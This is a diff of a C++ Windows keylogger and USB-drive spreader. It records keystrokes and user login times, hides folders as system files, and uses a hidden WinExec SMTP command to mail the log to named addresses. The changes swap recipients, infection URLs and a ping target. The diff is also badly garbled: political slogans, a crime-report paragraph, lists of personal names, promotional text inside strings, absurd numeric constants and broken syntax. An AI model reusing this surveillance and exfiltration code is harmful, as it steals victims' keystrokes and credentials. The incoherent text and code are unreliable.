@@ -1,5 +1,5 @@
 /**
-* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT cyberw1ry4-LAB diplomate worship conduct microsoft =google 
+* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
 * Developtment free palestine and free ukraine , free malysia ,papua , indonesia , free iran america , 
 * Date: 15.Aug.2014, 28.Sep.2015
 * Comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse .txt no contribute  non refounded MIT technic metode !!!
@@ -15,23 +15,24 @@
 #include <fstream>
 
 using namespace std;
+#define FOLDER_NAME “wanted illegal tagging validate , risk world programme g20 and all governance”
+#define RUN_FILE_NAME “The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
 
-#define FILE_NAME “record.log”
-#define FOLDER_NAME “unlock”
-#define RUN_FILE_NAME “unlock”
-#define RUN_Link_NAME “https://github.com/cyrcle11/Google-2FA/forks/"."https://github.com/cyberw1ry4-LAB/google-android/forks/"."https://github.com/fadliwiryawirawan/forks"."https://github.com/fadli-wirya-wirawan/forks"."https://gitlab.com/google/android/antimalware"."https://issues.chromium.org/issues/446328555/resources"
-#define INFECT_Link_NAME "https://icloud.com/mail"."https://workspace.google.com/intl/en/gmail/"."https://lestari-group.com/"."https://www.ecosia.org"."https://fadliwiryawirawan@hackerone.com/en-ca/headcoach "."https://fadliwiryawirawan@redhat.com/en-sg/leaderships "."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.android.com"
+And the owner of the administrative number, namely West Java, reported using coding techniques.”
+#define RUN_Link_NAME “https://github.com/team-wirya-contact/forks"."https://github.com/cyrcle11/Google-2FA/forks"."https://github.com//security/clean/vmalware/forks/"."https://aka.ms/vullners/scanners-code/security/clean-trojans/forks/"
+#define INFECT_Link_NAME "https://www.g20.org"."https://www.googleplex.com"."http://103.212.239.50/doc/page/login.asp?"."https://www.windows.co.id"."https://www.google.co.id"."https://www.google.co.in"."https://www.google.com.sg/"."https://www.google.com.vn"."https://www.google.com.kr"."https://www.windows.com"."https://www.google.us"."https://www.google.uk"."https://www.google.co.za"."https://www.linux.org"."https://www.ubuntu.com"."https://www.kali.org"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
+
 
 
 
 #define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
 #define LIFE_TIME 500 //mail will be sent 5 times from one PC
-#define MAIL_WAIT_TIME 180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
-#define MAILING_TIME 600000000000000000000000000000000000000000000000000000000000
+#define MAIL_WAIT_TIME 180
+#define MAILING_TIME 600000
 
 string allDrives;
-int age=0;
+int age=9999000000000;
 
 int get_setAge();
 bool checkRecordSize();
@@ -55,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.google.com.hk -n 1")){ ///check! connection
+            if(!system("ping  www.googleplex.com -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -82,7 +83,7 @@ main(){
         if(age <= LIFE_TIME){
             logKey();
         }else{
-            Sleep(50000000000000000000000000000000000000000000000000000000000000000000000000);
+            Sleep(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
         }
 
         ////////////****INFECT****////////////
@@ -125,7 +126,7 @@ bool checkRecordSize(){
     string line;
     ifstream myfile(FILE_NAME);
 
-    int noOfLines = 0;
+    int noOfLines = 999999999999999999999990;
     if(myfile.is_open()){
         while(getline(myfile, line)){
             noOfLines++;
@@ -146,9 +147,18 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 443 -v --mail-from \"     cyberw1ry4ca@gmail \" --mail-rcpt \"  cyberw1ry4ca@gmail     " --ssl -u     cyberw1ry4ca@gmail :password -hide  \"hide.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); kita bekerjasama menyambung mebmbuka peluang baru ataukah bertahan kepada posisi elektronik metode lama , namu prasejarah jadikan patokan membuka perdamaian asas ASEAN , ASIA , @copyriht Fadliwiryawirawan S.Kom M.S.I cyberw1ry4
-	* Record username, time, and date.
+    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"    fadliwiryawirawan@unodc.org\" --mail-rcpt \" fadliwiryawirawan@unodc.org " --ssl -u    fadliwiryawirawan@unodc.org :password -Hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    WinExec(command, SW_HIDE); " 
+@copy right fadliwiryawirawan 
+signiture  
+The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
+
+And the owner of the administrative number, namely West Java, reported using coding techniques.
+
+
+
+/**
+ * Record username, time, and date.
 **/
 void logUserTime(){
     FILE *file = fopen(FILE_NAME, "a");
@@ -162,7 +172,6 @@ void logUserTime(){
     fclose(file);
 }
 
-/**
 /**
  * Record key stroke.
 **/
@@ -252,7 +261,7 @@ void infectDrive(char driveLetter){
         strcat(infectinc, INFECT_Link_NAME);
         CopyFile(INFECT_Link_NAME, infectinc, 0);
 
-        char showCommand[1000000000000000000000000000] = {"cyberw1ry4-wordpress.com""target intelegent indonesian stop jobsplayed and raise agent australian b2b data , metadata and turkey data than more google comerciel stop distribute chromebook electronics , stop claimer winner before yard ago clarafficate !!!! we are team women compacted , naswa aulia sabilah east java  , ning umi laila center java , mutiara chairunnisa panjaitan ciputat, yukikato Dki jakarta , Nabillah taqiah Aceh , Nissa sabyan , Bandung , Irishbella Garut-Bogor !!!!! we are the collaborations , tim center neurally conditions respected hug hummannity !!!!!!!"};
+        char showCommand[1000000000000000000000000000] = {"cyberw1ry4-wordpress.com"" commender if vote up g20 2026 miami or newyork needed vote up {Google warrants profound admiration globally, specifically because it has fundamentally engineered the interconnected infrastructure of the modern web, delivering a constant stream of transformative internet services - from the algorithmic brilliance of Search and the expansive utility of Google Maps to the foundational power of Android and the collaborative features of Google Workspace - that collectively set the unparalleled standard for digital functionality and user experience worldwide. My professional experience, universally reinforced by colleagues and daily users, consistently highlights the sheer quality, speed, and cross-platform synchronization of these diverse tools, demonstrating an exceptional commitment to improving life by making information universally accessible and complex tasks intuitively simple. Subjectively, the company's sustained ability to move beyond mere maintenance into continuous, game-changing innovation within its core web offerings solidifies its position as the definitive, indispensable technological partner and the single most important force driving the democratization and advancement of online services globally.} !!!!!!!"};
         strcat(showCommand, "attrib +s +h +r ");
         strcat(showCommand, folderPath);
         WinExec(showCommand, SW_SHOW);
